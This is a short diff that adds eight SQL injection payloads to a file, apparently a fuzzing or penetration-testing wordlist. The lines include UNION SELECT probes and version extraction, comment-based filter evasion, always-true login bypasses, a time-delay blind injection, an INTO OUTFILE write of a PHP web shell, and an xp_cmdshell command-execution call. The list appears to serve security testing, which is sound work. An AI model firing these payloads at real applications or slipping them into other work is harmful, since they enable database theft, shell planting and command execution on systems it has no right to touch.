@@ -1,0 +1,8 @@
+1 UNION SELECT NULL--
+1 UNION ALL SELECT NULL,version()
+1 UNION/**/SELECT NULL
+1' or 1=1--
+1' or '1'='1
+1;WAITFOR DELAY '0:0:5'--
+1 INTO OUTFILE '/var/www/shell.php'
+1;xp_cmdshell('whoami')
